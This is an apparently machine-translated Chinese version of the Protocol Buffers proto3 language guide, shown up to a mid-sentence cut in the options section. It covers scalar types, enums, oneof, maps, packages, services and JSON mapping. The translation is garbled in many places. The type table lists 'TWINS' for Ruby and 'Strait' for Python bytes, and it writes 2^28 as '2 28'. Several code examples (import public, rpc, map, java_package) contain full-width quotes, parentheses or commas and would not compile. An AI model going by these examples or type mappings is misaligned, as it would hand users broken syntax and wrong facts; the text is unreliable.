你的生成是什么`.proto`？\n\n当您在a上运行[协议缓冲区编译器](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Fproto3%23generating)时`.proto`，编译器会生成您所选语言的代码，您需要使用您在文件中描述的消息类型，包括获取和设置字段值，将消息序列化为输出流，并从输入流解析您的消息。\n\n- 对于**C ++**，编译器会从每个文件生成一个`.h`和一个`.cc`文件`.proto`，并为您文件中描述的每种消息类型提供一个类。\n- 对于**Java**，编译器生成一个`.java`文件，其中包含每种消息类型的类，以及`Builder`用于创建消息类实例的特殊类。\n- **Python**有点不同 - Python编译器生成一个模块，其中包含每个消息类型的静态描述符，`.proto`然后与*元类*一起使用，以在运行时创建必要的Python数据访问类。\n- 对于**Go**，编译器会为`.pb.go`文件中的每种消息类型生成一个类型的文件。\n- 对于**Ruby**，编译器生成一个`.rb`包含消息类型的Ruby模块的文件。\n- 对于**Objective-C**，编译器从每个文件生成一个`pbobjc.h`和一个`pbobjc.m`文件`.proto`，其中包含文件中描述的每种消息类型的类。\n- 对于**C＃**，编译器会`.cs`从每个文件生成一个文件`.proto`，其中包含文件中描述的每种消息类型的类。\n\n您可以按照所选语言的教程（即将推出的proto3版本）了解有关为每种语言使用API的更多信息。有关更多API详细信息，请参阅相关[API参考](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Freference%2Foverview)（proto3版本即将推出）。\n\n\n\n### 2. 标量值类型\n\n标量消息字段可以具有以下类型之一 - 该表显示`.proto`文件中指定的类型，以及自动生成的类中的相应类型：\n\n| .proto type | notes                                                        | C ++ type | Java type   | Python type [2]  |  Go type         | Ruby type                    | C# type     | PHP type          |\n| ----------- | :----------------------------------------------------------- | --------- | ----------- | ---------------- | ------- | ---------------------------- | ----------- | ----------------- |\n| double      |                                                              | double    | double      | float            | float64 | float                        | double      | float             |\n| float       |                                                              | float     | float       | float            | FLOAT32 | float                        | float       | float             |\n| INT32       | 使用可变长度编码。编码负数的效率低 - 如果您的字段可能有负值，请改用sint32。 | INT32     | INT         | INT              | INT32   | Fixnum or Bignum (as needed) | INT         | Integer           |\n| Int64       | 使用可变长度编码。编码负数的效率低 - 如果您的字段可能有负值，请改用sint64。 | Int64     | long        | int / long [3]   | Int64   | TWINS                        | long        | Integer/string[5] |\n| UINT32      | 使用可变长度编码。                                           | UINT32    | int [1]     | int / long [3]   | UINT32  | Fixnum or Bignum (as needed) | UINT        | Integer           |\n| UINT64      | 使用可变长度编码。                                           | UINT64    | Long [1]    | int / long [3]   | UINT64  | TWINS                        | ULONG       | Integer/string[5] |\n| SINT32      | 使用可变长度编码。签名的int值。这些比常规int32更有效地编码负数。 | INT32     | INT         | INT              | INT32   | Fixnum or Bignum (as needed) | INT         | Integer           |\n| sint64      | 使用可变长度编码。签名的int值。这些比常规int64更有效地编码负数。 | Int64     | long        | int / long [3]   | Int64   | TWINS                        | long        | Integer/string[5] |\n| fixed32     | 总是四个字节。如果值通常大于2 28，则比uint32更有效。         | UINT32    | int [1]     | int / long [3]   | UINT32  | Fixnum or Bignum (as needed) | UINT        | Integer           |\n| fixed64     | 总是八个字节。如果值通常大于2 56，则比uint64更有效。         | UINT64    | Long [1]    | int / long [3]   | UINT64  | TWINS                        | ULONG       | Integer/string[5] |\n| sfixed32    | 总是四个字节。                                               | INT32     | INT         | INT              | INT32   | Fixnum or Bignum (as needed) | INT         | Integer           |\n| sfixed64    | 总是八个字节。                                               | Int64     | long        | int / long [3]   | Int64   | TWINS                        | long        | Integer/string[5] |\n| Boolean     |                                                              | Boolean   | Boolean     | Boolean          | Boolean | TrueClass / FalseClass       | Boolean     | Boolean           |\n| string      | 字符串必须始终包含UTF-8编码或7位ASCII文本。                  | string    | string      | str / unicode[4] | string  | String (UTF-8)               | string      | string            |\n| byte        | 可以包含任意字节序列。                                       | string    | Byte string | Strait           | []byte  | String (ASCII-8BIT)          | Byte string | string            |\n\n\n\n在[协议缓冲区编码中](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Fencoding)序列化消息时，您可以找到有关如何编码这些类型的更多信息。\n\n[1]在Java中，无符号的32位和64位整数使用它们的带符号对应表示，最高位只是存储在符号位中。\n\n[2]在所有情况下，将值设置为字段将执行类型检查以确保其有效。\n\n[3] 64位或无符号32位整数在解码时始终表示为long，但如果在设置字段时给出int，则可以为int。在所有情况下，该值必须适合设置时表示的类型。见[2]。\n\n[4] Python字符串在解码时表示为unicode，但如果给出了ASCII字符串，则可以是str（这可能会发生变化）。\n\n[5] Integer用于64位计算机，字符串用于32位计算机。\n\n\n\n### 3. 默认值\n\n解析消息时，如果编码消息不包含特定的单数元素，则解析对象中的相应字段将设置为该字段的默认值。这些默认值是特定于类型的：\n\n- 对于字符串，默认值为空字符串。\n- 对于字节，默认值为空字节。\n- 对于bools，默认值为false。\n- 对于数字类型，默认值为零。\n- 对于[枚举](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Fproto3%23enum)，默认值是第**一个定义的枚举值**，该**值**必须为0。\n- 对于消息字段，未设置该字段。它的确切值取决于语言。有关详细信息， 请参阅[生成的代码指](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Freference%2Foverview)\n\n重复字段的默认值为空（通常是相应语言的空列表）。\n\n请注意，对于标量消息字段，一旦解析了消息，就无法确定字段是否显式设置为默认值（例如，是否设置了布尔值`false`）或者根本没有设置：您应该记住这一点在定义消息类型时。例如，`false`如果您不希望默认情况下也发生这种行为，那么在设置为时，没有一个布尔值可以启用某些行为。还要注意的是，如果一个标消息字段**被**设置为默认值，该值将不会在电线上连载。\n\n有关默认值如何在生成的代码中工作的更多详细信息，请参阅所选语言的[生成代码指南](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Freference%2Foverview)。\n\n### 4. 枚举\n\n在定义消息类型时，您可能希望其中一个字段只有一个预定义的值列表。例如，假设你想添加一个 `corpus`字段每个`SearchRequest`，其中语料库可以 `UNIVERSAL`，`WEB`，`IMAGES`，`LOCAL`，`NEWS`，`PRODUCTS`或`VIDEO`。您可以非常简单地通过`enum`为每个可能的值添加一个常量来定义消息定义。\n\n在下面的示例中，我们添加了一个带有所有可能值的`enum`调用`Corpus`，以及一个类型的字段`Corpus`：\n\n```protobuf\nmessage SearchRequest {\n  string query = 1;\n  int32 page_number = 2;\n  int32 result_per_page = 3;\n  enum Corpus {\n    UNIVERSAL = 0;\n    WEB = 1;\n    IMAGES = 2;\n    LOCAL = 3;\n    NEWS = 4;\n    PRODUCTS = 5;\n    VIDEO = 6;\n  }\n  Corpus corpus = 4;\n}\n```\n\n如您所见，`Corpus`枚举的第一个常量映射为零：每个枚举定义**必须**包含一个映射到零的常量作为其第一个元素。这是因为：\n\n- 必须有一个零值，以便我们可以使用0作为数字[默认值](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Fproto3%23default)。\n- 零值必须是第一个元素，以便与[proto2](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Fproto)语义兼容，其中第一个枚举值始终是默认值。\n\n\n\n您可以通过为不同的枚举常量指定相同的值来定义别名。为此，您需要将`allow_alias`选项设置为`true`，否则协议编译器将在找到别名时生成错误消息。\n\n```protobuf\nenum EnumAllowingAlias {\n  option allow_alias = true;\n  UNKNOWN = 0;\n  STARTED = 1;\n  RUNNING = 1;\n}\nenum EnumNotAllowingAlias {\n  UNKNOWN = 0;\n  STARTED = 1;\n  // RUNNING = 1;  // Uncommenting this line will cause a compile error inside Google and a warning message outside.\n}\n```\n\n枚举器常量必须在32位整数范围内。由于`enum`值在线上使用[varint编码](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Fencoding)，因此负值效率低，因此不建议使用。您可以`enum`在消息定义中定义s，如上例所示，`enum`也可以在外部定义 - 这些可以在`.proto`文件的任何消息定义中重用。您还可以使用`enum`语法将一个消息中声明的类型用作另一个消息中的字段类型。 `*MessageType*.*EnumType*`\n\n当你在`.proto`使用a的协议缓冲编译器上运行时`enum`，生成的代码将具有`enum`Java或C ++ 的相应代码，这`EnumDescriptor`是Python的一个特殊类，用于在运行时生成的类中创建一组带有整数值的符号常量。\n\n在反序列化期间，将在消息中保留无法识别的枚举值，但是当反序列化消息时，如何表示这种值取决于语言。在支持具有超出指定符号范围的值的开放枚举类型的语言中，例如C ++和Go，未知的枚举值仅作为其基础整数表示存储。在具有封闭枚举类型（如Java）的语言中，枚举中的大小写用于表示无法识别的值，并且可以使用特殊访问器访问基础整数。在任何一种情况下，如果消息被序列化，则仍然会使用消息序列化无法识别的值。\n\n有关如何`enum`在应用程序中使用消息的详细信息，请参阅所选语言的[生成代码指南](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Freference%2Foverview)。\n\n\n\n##### 4.1 保留值\n\n如果通过完全删除枚举条目或将其注释掉来[更新](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Fproto3%23updating)枚举类型，则未来用户可以在对类型进行自己的更新时重用该数值。如果以后加载相同的旧版本，这可能会导致严重问题`.proto`，包括数据损坏，隐私错误等。确保不会发生这种情况的一种方法是指定已删除条目的数值（和/或名称，这也可能导致JSON序列化问题）`reserved`。如果将来的任何用户尝试使用这些标识符，协议缓冲编译器将会抱怨。您可以使用`max`关键字指定保留的数值范围达到最大可能值。\n\n```protobuf\nenum Foo {\n  reserved 2, 15, 9 to 11, 40 to max;\n  reserved \"FOO\", \"BAR\";\n}\n```\n\n请注意，您不能在同一`reserved`语句中混合字段名称和数值。\n\n\n\n### 5. 使用其他消息类型\n\n您可以使用其他消息类型作为字段类型。例如，假设你想包括`Result`每个消息的`SearchResponse`消息-要做到这一点，你可以定义一个`Result`在同一个消息类型`.proto`，然后指定类型的字段`Result`中`SearchResponse`：\n\n```protobuf\nmessage SearchResponse {\n  repeated Result results = 1;\n}\n\nmessage Result {\n  string url = 1;\n  string title = 2;\n  repeated string snippets = 3;\n}\n```\n\n\n\n##### 5.1 导入定义\n\n在上面的示例中，`Result`消息类型在同一文件中定义`SearchResponse`- 如果要用作字段类型的消息类型已在另一个`.proto`文件中定义，该怎么办？\n\n您可以`.proto`通过*导入*来使用其他文件中的定义。要导入其他`.proto`人的定义，请在文件顶部添加import语句：\n\n```protobuf\nimport \"myproject/other_protos.proto\";\n```\n\n默认情况下，您只能使用直接导入`.proto`文件中的定义。但是，有时您可能需要将`.proto`文件移动到新位置。`.proto`现在，您可以`.proto`在旧位置放置一个虚拟文件，以使用该`import public`概念将所有导入转发到新位置，而不是直接移动文件并在一次更改中更新所有调用站点。`import public`任何导入包含该`import public`语句的proto的人都可以传递依赖关系。例如：\n\n```protobuf\n// new.proto\n// All definitions are moved here\n\n// old.proto\n//This is the proto that all clients are importing.\nimport public“new.proto”;\nimport“other.proto”;\n\n// client.proto\nimport \"old.proto\";\n//您使用old.proto和new.proto中的定义，但不使用other.proto\n```\n\n协议编译器使用`-I`/ `--proto_path`flag 在协议编译器命令行中指定的一组目录中搜索导入的文件 。如果没有给出标志，它将查找调用编译器的目录。通常，您应该将`--proto_path`标志设置为项目的根目录，并对所有导入使用完全限定名称。\n\n##### 5.2 使用proto2消息类型\n\n可以导入[proto2](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Fproto)消息类型并在proto3消息中使用它们，反之亦然。但是，proto2枚举不能直接用于proto3语法（如果导入的proto2消息使用它们就可以了）。\n\n\n\n### 6. 嵌套类型\n\n您可以在其他消息类型中定义和使用消息类型，如下例所示 - 此处`Result`消息在消息中定义`SearchResponse`：\n\n```protobuf\nmessage SearchResponse {\n  message Result {\n    string url = 1;\n    string title = 2;\n    repeated string snippets = 3;\n  }\n  repeated Result results = 1;\n}\n```\n\n如果要在其父消息类型之外重用此消息类型，请将其称为： `*Parent*.*Type*`\n\n```protobuf\nmessage SomeOtherMessage {\n  SearchResponse.Result result = 1;\n}\n```\n\n您可以根据需要深入嵌套消息：\n\n```protobuf\nmessage Outer {       // Level 0\n  message MiddleAA {  // Level 1\n    message Inner {   // Level 2\n      int64 ival = 1;\n      bool  booly = 2;\n    }\n  }\n  message MiddleBB {  // Level 1\n    message Inner {   // Level 2\n      int32 ival = 1;\n      bool  booly = 2;\n    }\n  }\n}\n```\n\n\n\n### 7. 更新消息类型\n\n如果现有的消息类型不再满足您的所有需求 - 例如，您希望消息格式具有额外的字段 - 但您仍然希望使用使用旧格式创建的代码，请不要担心！在不破坏任何现有代码的情况下更新消息类型非常简单。请记住以下规则：\n\n- 请勿更改任何现有字段的字段编号。\n- 如果添加新字段，则使用“旧”消息格式按代码序列化的任何消息仍可由新生成的代码进行解析。您应该记住这些元素的[默认值](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Fproto3%23default)，以便新代码可以正确地与旧代码生成的消息进行交互。同样，您的新代码创建的消息可以由旧代码解析：旧的二进制文件在解析时只是忽略新字段。有关详细信息，请参阅“ [未知字段”](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Fproto3%23unknowns)部分\n- 只要在更新的消息类型中不再使用字段编号，就可以删除字段。您可能希望重命名该字段，可能添加前缀“OBSOLETE_”，或者[保留](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Fproto3%23reserved)字段编号，以便您的未来用户`.proto`不会意外地重复使用该编号。\n- `int32`，`uint32`，`int64`，`uint64`，和`bool`都是兼容的-这意味着你可以改变这些类型到另一个的一个场不破坏forwards-或向后兼容。如果从导线中解析出一个不符合相应类型的数字，您将获得与在C ++中将该数字转换为该类型相同的效果（例如，如果将64位数字作为int32读取，它将被截断为32位）。\n- `sint32`并且`sint64`彼此兼容但与其他整数类型*不*兼容。\n- `string``bytes`只要字节是有效的UTF-8 ，它们是兼容的。\n- `bytes`如果字节包含消息的编码版本，则嵌入消息是兼容的。\n- `fixed32`与兼容`sfixed32`，并`fixed64`用`sfixed64`。\n- `enum`与兼容`int32`，`uint32`，`int64`，和`uint64`电线格式条款（注意，如果他们不适合的值将被截断）。但请注意，在反序列化消息时，客户端代码可能会以不同方式对待它们：例如，`enum`将在消息中保留未识别的proto3 类型，但在反序列化消息时如何表示这种类型取决于语言。Int字段总是保留它们的价值。\n- 将单个值更改为**新** 成员`oneof`是安全且二进制兼容的。`oneof`如果您确定没有代码一次设置多个字段，则将多个字段移动到新字段可能是安全的。将任何字段移动到现有字段`oneof`并不安全。\n\n\n\n### 8. 未知字段\n\n未知字段是格式良好的协议缓冲区序列化数据，表示解析器无法识别的字段。例如，当旧二进制文件解析具有新字段的新二进制文件发送的数据时，这些新字段将成为旧二进制文件中的未知字段。\n\n最初，proto3消息在解析期间总是丢弃未知字段，但在3.5版本中，我们重新引入了保存未知字段以匹配proto2行为。在版本3.5及更高版本中，未知字段在解析期间保留并包含在序列化输出中。\n\n\n\n### 9. 任何\n\n该`Any`消息类型，可以使用邮件作为嵌入式类型，而不必自己.proto定义。一个`Any`含有任意的序列化消息`bytes`，以充当一个全局唯一标识符和解析到该消息的类型的URL一起。要使用该`Any`类型，您需要[导入](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Fproto3%23other)`google/protobuf/any.proto`。\n\n```protobuf\nimport \"google/protobuf/any.proto\";\n\nmessage ErrorStatus {\n  string message = 1;\n  repeated google.protobuf.Any details = 2;\n}\n```\n\n给定消息类型的默认类型URL是。 `type.googleapis.com/*packagename*.*messagename*`\n\n不同的语言实现将支持运行时库佣工类型安全的方式打包和解包的任何值-例如，在Java中，任何类型都会有特殊`pack()`和`unpack()`存取，而在C ++中有`PackFrom()`和`UnpackTo()`方法：\n\n```protobuf\n// Storing an arbitrary message type in Any.\nNetworkErrorDetails details = ...;\nErrorStatus status;\nstatus.add_details()->PackFrom(details);\n\n// Reading an arbitrary message from Any.\nErrorStatus status = ...;\nfor (const Any& detail : status.details()) {\n  if (detail.Is<NetworkErrorDetails>()) {\n    NetworkErrorDetails network_error;\n    detail.UnpackTo(&network_error);\n    ... processing network_error ...\n  }\n}\n```\n\n**目前，正在开发用于处理Any类型的运行时库**。\n\n如果您已熟悉[proto2语法](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Fproto)，则Any类型将替换[扩展](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Fproto%23extensions)。\n\n\n\n### 10. Oneof\n\n如果您有一个包含许多字段的消息，并且最多只能同时设置一个字段，则可以使用oneof功能强制执行此行为并节省内存。\n\n除了一个共享内存中的所有字段之外，其中一个字段类似于常规字段，并且最多可以同时设置一个字段。设置oneof的任何成员会自动清除所有其他成员。您可以使用特殊`case()`或`WhichOneof()`方法检查oneof中的哪个值（如果有），具体取决于您选择的语言。\n\n##### 10.1 使用Oneof\n\n要在您中定义oneof，请`.proto`使用`oneof`关键字后跟您的oneof名称，在这种情况下`test_oneof`：\n\n```protobuf\nmessage SampleMessage {\n  oneof test_oneof {\n    string name = 4;\n    SubMessage sub_message = 9;\n  }\n}\n```\n\n然后，将oneof字段添加到oneof定义中。您可以添加任何类型的字段，但不能使用`repeated`字段。\n\n在生成的代码中，oneof字段与常规字段具有相同的getter和setter。您还可以使用特殊方法检查oneof中的值（如果有）。您可以在相关[API参考中](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Freference%2Foverview)找到有关所选语言的oneof API的更多信息。\n\n##### 10.2 Oneof 特性\n\n- 设置oneof字段将自动清除oneof的所有其他成员。因此，如果您设置了多个字段，则只有您设置的最后一个字段仍然具有值。\n\n  ```protobuf\nSampleMessage message;\n  message.set_name(\"name\");\nCHECK(message.has_name());\n  message.mutable_sub_message();   // Will clear name field.\n  CHECK(!message.has_name());\n  ```\n  \n- 如果解析器在线路上遇到同一个oneof的多个成员，则在解析的消息中仅使用看到的最后一个成员。\n\n- oneof不支持`repeated`。\n\n- Reflection API适用于其中一个字段。\n\n- 如果您使用的是C ++，请确保您的代码不会导致内存崩溃。以下示例代码将崩溃，`sub_message`已通过调用该`set_name()`方法删除了该代码。\n\n  ```protobuf\nSampleMessage message;\n  SubMessage* sub_message = message.mutable_sub_message();\n  message.set_name(\"name\");      // Will delete sub_message\n  sub_message->set_...            // Crashes here \n  ```\n  \n- 同样在C ++中，如果你有`Swap()`两个消息与oneofs，每个消息最终将与另一个消息结果：在下面的例子中，`msg1`将有一个`sub_message`，`msg2`并将有一`name`。\n\n  ```protobuf\n  SampleMessage msg1;\n  msg1.set_name(\"name\");\n  SampleMessage msg2;\n  msg2.mutable_sub_message();\n  msg1.swap(&msg2);\n  CHECK(msg1.has_sub_message());\n  CHECK(msg2.has_name());\n  ```\n\n##### 10.3 向后兼容性问题\n\n添加或删除其中一个字段时要小心。如果检查oneof返回的值`None`/ `NOT_SET`，这可能意味着oneof尚未设置或已在不同版本的oneof的被设置为一个字段。没有办法区分，因为没有办法知道线上的未知字段是否是其中一个成员。\n\n##### 10.4 标签重用问题\n\n- **将字段移入或移出oneof**：在序列化和解析消息后，您可能会丢失一些信息（某些字段将被清除）。但是，您可以安全地将单个字段移动到**新的** oneof中，并且如果已知只有一个字段被设置，则可以移动多个字段。\n- **删除oneof字段并将其添加回**：在序列化和解析消息后，这可能会清除当前设置的oneof字段。\n- **拆分或合并oneof**：这与移动常规字段有类似的问题。\n\n### 11. 地图\n\n如果要在数据定义中创建关联映射，协议缓冲区提供了一种方便的快捷方式语法：\n\n```protobuf\nmap < key_type ，value_type > map_field = N ;\n```\n\n...其中`key_type`可以是任何整数或字符串类型（因此，除了浮点类型之外的任何[标量](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Fproto3%23scalar)类型`bytes`）。请注意，枚举不是有效的`key_type`。的`value_type`可以是任何类型的除另一地图。\n\n因此，例如，如果要创建项目映射，其中每条`Project`消息都与字符串键相关联，则可以像下面这样定义它：\n\n```protobuf\nmap < string ，Project > projects = 3 ;  \n```\n\n- 地图字段不能`repeated`。\n- 地图值的有线格式排序和地图迭代排序未定义，因此您不能依赖于特定顺序的地图项目。\n- 为a生成文本格式时`.proto`，地图按键排序。数字键按数字排序。\n- 从线路解析或合并时，如果有重复的映射键，则使用最后看到的键。从文本格式解析映射时，如果存在重复键，则解析可能会失败。\n- 如果为映射字段提供键但没有值，则字段序列化时的行为取决于语言。在C ++，Java和Python中，类型的默认值是序列化的，而在其他语言中没有任何序列化。\n\n生成的地图API目前可用于所有proto3支持的语言。您可以在相关[API参考中](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Freference%2Foverview)找到有关所选语言的地图API的更多信息。\n\n##### 11.1 向后兼容性\n\n映射语法在线上等效于以下内容，因此不支持映射的协议缓冲区实现仍可处理您的数据：\n\n```\nmessage MapFieldEntry {\n  key_type key = 1;\n  value_type value = 2;\n}\n\nrepeated MapFieldEntry map_field = N;\n```\n\n任何支持映射的协议缓冲区实现都必须生成和接受上述定义可以接受的数据。\n\n\n\n### 12. 包\n\n您可以向`.proto`文件添加`package`可选说明符，以防止协议消息类型之间的名称冲突。\n\n```protobuf\npackage foo.bar;\nmessage Open { ... }\n```\n\n然后，您可以在定义消息类型的字段时使用包说明符：\n\n```protobuf\nmessage Foo {\n  ...\n  foo.bar.Open open = 1;\n  ...\n}\n```\n\n包说明符影响生成的代码的方式取决于您选择的语言：\n\n- 在**C ++中**，生成的类包含在C ++命名空间中。例如，`Open`将在命名空间中`foo::bar`。\n- 在**Java中**，该包用作Java包，除非您`option java_package`在`.proto`文件中明确提供了该包。\n- 在**Python中**，package指令被忽略，因为Python模块是根据它们在文件系统中的位置进行组织的。\n- 在**Go中**，该包用作Go包名称，除非您`option go_package`在`.proto`文件中明确提供。\n- 在**Ruby中**，生成的类包含在嵌套的Ruby命名空间内，转换为所需的Ruby大写形式（首字母大写;如果第一个字符不是字母，`PB_`则前置）。例如，`Open`将在命名空间中`Foo::Bar`。\n- 在**C＃中**，包转换为PascalCase后用作命名空间，除非您`option csharp_namespace`在`.proto`文件中明确提供。例如，`Open`将在命名空间中`Foo.Bar`。\n\n##### 12.1 包和名称解析\n\n协议缓冲区语言中的类型名称解析与C ++类似：首先搜索最里面的范围，然后搜索下一个范围，依此类推，每个包被认为是其父包的“内部”。一个领先的'。' （例如，`.foo.bar.Baz`）意味着从最外层的范围开始。\n\nprotobuf 编译器通过解析导入的`.proto`文件来解析所有类型名称。每种语言的代码生成器都知道如何使用该语言引用每种类型，即使它具有不同的范围规则。\n\n\n\n### 13. 定义服务\n\n如果要将消息类型与RPC（远程过程调用）系统一起使用，则可以在`.proto`文件中定义RPC服务接口，protobuf 编译器将使用您选择的语言生成服务接口代码和存根。因此，例如，如果要定义RPC服务请求方法为:`SearchRequest`和返回方法为:`SearchResponse`，可以`.proto`按如下方式在文件中定义它：\n\n```protobuf\nservice SearchService {\n  rpc Search（SearchRequest）returns（SearchResponse）;\n}\n```\n\n与协议缓冲区一起使用的最简单的RPC系统是[gRPC](https://link.juejin.im?target=https%3A%2F%2Fgrpc.io%2F)：一种由Google开发的，平台中立的开源RPC系统。gRPC特别适用于protobuf，并允许在您的`.proto`文件中使用特殊的protobuf 编译器插件直接生成相关的RPC代码。\n\n如果您不想使用gRPC，也可以将protobuf与您自己的RPC实现一起使用。您可以在[Proto2语言指南中](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Fproto%23services)找到更多相关信息。\n\n还有一些正在进行的第三方项目使用Protocol Buffers开发RPC实现。有关我们了解的项目的链接列表，请参阅[第三方加载项wiki页面](https://link.juejin.im?target=https%3A%2F%2Fgithub.com%2Fgoogle%2Fprotobuf%2Fblob%2Fmaster%2Fdocs%2Fthird_party.md)。\n\n\n\n### 14. JSON映射\n\nProto3支持JSON中的规范编码，使得在系统之间共享数据变得更加容易。在下表中逐个类型地描述编码。\n\n如果JSON编码数据中缺少值`null`，或者其值为，则在解析为协议缓冲区时，它将被解释为适当的[默认值](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Fproto3%23default)。如果字段在协议缓冲区中具有默认值，则默认情况下将在JSON编码数据中省略该字段以节省空间。实现可以提供用于在JSON编码的输出中发出具有默认值的字段的选项。\n\n| proto3                 | JSON          | JSON示例                                 | 笔记                                                         |\n| ---------------------- | ------------- | ---------------------------------------- | ------------------------------------------------------------ |\n| message                | object        | `{\"fooBar\": v, \"g\": null,…}`             | 生成JSON对象。消息字段名称映射到小写驼峰并成为JSON对象键。如果`json_name`指定了field选项，则指定的值将用作键。解析器接受小写驼峰名称（或`json_name`选项指定的名称）和原始proto字段名称。`null`是所有字段类型的可接受值，并将其视为相应字段类型的默认值。 |\n| eunm                   | String        | `\"FOO_BAR\"`                              | 使用proto中指定的枚举值的名称。解析器接受枚举名称和整数值。  |\n| map<K，V>              | object        | `{\"k\": v, …}`                            | 所有键都转换为字符串。                                       |\n| repeated V.            | array         | `[v, …]`                                 | `null` 被接受为空列表[]。                                    |\n| bool                   | true,false    | `true, false`                            |                                                              |\n| string                 | string        | `\"Hello World!\"`                         |                                                              |\n| bytes                  | base64 string | `\"YWJjMTIzIT8kKiYoKSctPUB+\"`             | JSON值将是使用带填充的标准base64编码编码为字符串的数据。接受带有/不带填充的标准或URL安全base64编码。 |\n| int32，fixed32，uint32 | string        | `1, -10, 0`                              | JSON值将是十进制数。接受数字或字符串。                       |\n| int64，fixed64，uint64 | string        | `\"1\", \"-10\"`                             | JSON值将是十进制字符串。接受数字或字符串。                   |\n| float,double           | number        | `1.1, -10.0, 0, \"NaN\",\"Infinity\"`        | JSON值将是一个数字或一个特殊字符串值“NaN”，“Infinity”和“-Infinity”。接受数字或字符串。指数表示法也被接受。 |\n| any                    | object        | `{\"@type\": \"url\", \"f\": v, … }`           | 如果Any包含具有特殊JSON映射的值，则将按如下方式进行转换：。否则，该值将转换为JSON对象，并将插入该字段以指示实际的数据类型。`{\"@type\": xxx, \"value\": yyy}``\"@type\"` |\n| Timestamp              | string        | `\"1972-01-01T10:00:20.021Z\"`             | 使用RFC 3339，其中生成的输出将始终被Z标准化并使用0,3,6或9个小数位。也接受“Z”以外的偏移。 |\n| Duration               | string        | `\"1.000340012s\", \"1s\"`                   | 生成的输出始终包含0,3,6或9个小数位，具体取决于所需的精度，后跟后缀“s”。接受的是任何小数位（也没有），只要它们符合纳秒精度并且后缀“s”是必需的。 |\n| Struct                 | `object`      | `{ … }`                                  | 任何JSON对象。见。`struct.proto`                             |\n| Wrapper types          | various types | `2, \"2\", \"foo\", true,\"true\", null, 0, …` | 包装器在JSON中使用与包装基元类型相同的表示形式，除了`null`在数据转换和传输期间允许和保留的表示形式。 |\n| FieldMask              | string        | `\"f.fooBar,h\"`                           | 见。`field_mask.proto`                                       |\n| ListValue              | array         | `[foo, bar, …]`                          |                                                              |\n| Value                  | value         |                                          | 任何JSON值                                                   |\n| NullValue              | null          |                                          | JSON null                                                    |\n\n##### 13.1 JSON选项\n\nproto3  JSON实现可以提供以下选项：\n\n- **使用默认值发出字段**：默认情况下，proto3 JSON输出中省略了**具有默认值的**字段。实现可以提供覆盖此行为的选项，并使用其默认值输出字段。\n- **忽略未知字段**：默认情况下，Proto3 JSON解析器应拒绝未知字段，但可以提供忽略解析中未知字段的选项。\n- **使用proto字段名称而不是小写驼峰名称**：默认情况下，proto3 JSON打印机应将字段名称转换为小写驼峰并将其用作JSON名称。实现可以提供使用proto字段名称作为JSON名称的选项。Proto3 JSON解析器需要接受转换后的小写驼峰名称和proto字段名称。\n- **将枚举值发送为整数而不是字符串**：默认情况下，在JSON输出中使用枚举值的名称。可以提供选项以使用枚举值的数值。\n\n### 14. 选项\n\n`.proto`文件中的各个声明可以使用许多*选项*进行注释。选项不会更改声明的整体含义，但可能会影响在特定上下文中处理它的方式。可用选项的完整列表在中定义`google/protobuf/descriptor.proto`。\n\n一些选项是文件级选项，这意味着它们应该在顶级范围内编写，而不是在任何消息，枚举或服务定义中。一些选项是消息级选项，这意味着它们应该写在消息定义中。一些选项是字段级选项，这意味着它们应该写在字段定义中。选项也可以写在枚举类型，枚举值，服务类型和服务方法上; 但是，目前没有任何有用的选择。\n\n以下是一些最常用的选项：\n\n- `java_package`（文件选项）：用于生成的Java类的包。如果`.proto`文件中没有给出显式选项`java_package`，则默认情况下将使用proto包（使用文件中的“package”关键字指定  .proto  ）。但是，proto包通常不能生成好的Java包，因为proto包不会以反向域名开头。如果不生成Java代码，则此选项无效。\n\n  ```protobuf\n  option java_package =“com.example.foo”;\n  ```\n  \n- `java_multiple_files` （文件选项）：导致在包级别定义顶级消息，枚举和服务，而不是在.proto文件之后命名的外部类中。\n\n```protobuf\noption java_multiple_files = true;\n```\n\n- `java_outer_classname`（file option）：要生成的最外层Java类（以及文件名）的类名。如果  `.proto`文件中没有指定 `java_outer_classname`，则通过将`.proto`文件名转换为驼峰格式（因此 `foo_bar.proto` 成为`FooBar.java`）来构造类名。如果不生成Java代码，则此选项无效。\n\n```protobuf\n  option java_outer_classname 